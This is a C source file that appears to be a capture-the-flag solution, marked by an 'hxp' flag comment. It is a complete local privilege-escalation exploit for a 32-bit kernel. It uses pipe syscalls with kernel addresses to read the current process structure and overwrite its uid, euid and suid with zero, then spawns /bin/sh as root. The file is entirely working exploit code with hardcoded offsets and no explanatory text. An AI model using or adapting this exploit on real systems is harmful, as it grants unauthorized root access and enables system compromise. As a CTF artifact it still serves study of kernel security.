// i386-linux-musl-gcc -static -nostdlib -o exp exp.c
static inline int syscall1(int num, int a1) {
    int ret;
    __asm__ volatile("int $0x80" : "=a"(ret) : "a"(num), "b"(a1) : "memory");
    return ret;
}

static inline int syscall2(int num, int a1, int a2) {
    int ret;
    __asm__ volatile("int $0x80" : "=a"(ret) : "a"(num), "b"(a1), "c"(a2) : "memory");
    return ret;
}

static inline int syscall3(int num, int a1, int a2, int a3) {
    int ret;
    __asm__ volatile("int $0x80" : "=a"(ret) : "a"(num), "b"(a1), "c"(a2), "d"(a3) : "memory");
    return ret;
}

#define SYS_read     3
#define SYS_write    4
#define SYS_execve   11
#define SYS_pipe     42  

#define CURRENT_ADDR  0xc0144bf8

#define UID_OFFSET   0x2120
#define EUID_OFFSET  0x2124
#define SUID_OFFSET  0x2128

static inline int sys_read(int fd, void *buf, int count) { return syscall3(SYS_read, fd, (int)buf, count); }
static inline int sys_write(int fd, const void *buf, int count) { return syscall3(SYS_write, fd, (int)buf, count); }
static inline int sys_pipe(int *filedes) { return syscall1(SYS_pipe, (int)filedes); }
static inline int sys_execve(const char *path, char *const argv[], char *const envp[]) {
    return syscall3(SYS_execve, (int)path, (int)argv, (int)envp);
}

void print(const char *s) {
    int len = 0;
    while (s[len]) len++;
    sys_write(1, s, len);
}

unsigned int leak_kernel(unsigned int kaddr) {
    unsigned int value = 0;
    int p[2];

    if (sys_pipe(p) < 0) {
        print("[-] Pipe failed in leak\n");
        return 0;
    }

    sys_write(p[1], (void*)kaddr, 4); 
    sys_read(p[0], &value, 4);

    return value;
}

void write_kernel(unsigned int kaddr, void *data, int size) {
    int p[2];
    
    if (sys_pipe(p) < 0) {
        print("[-] Pipe failed in write\n");
    }

    sys_write(p[1], data, size);
    sys_read(p[0], (void*)kaddr, size);
}

// hxp{Don't panic wixer! it's just a nice hobby and not 🐧} 
void _start(void) {
    
    unsigned int proc_ptr = leak_kernel(CURRENT_ADDR);
    
    unsigned int uid_addr = proc_ptr + UID_OFFSET;
    unsigned int euid_addr = proc_ptr + EUID_OFFSET;
    unsigned int suid_addr = proc_ptr + SUID_OFFSET;
    
    char zeros[4] = {0};
    
    write_kernel(uid_addr, zeros, 4); 
    write_kernel(euid_addr, zeros, 4);
    write_kernel(suid_addr, zeros, 4);
   
    char *sh = "/bin/sh";
    char *argv[] = {"/bin/sh", (char*)0};
    char *envp[] = {(char*)0};
    sys_execve(sh, argv, envp);
}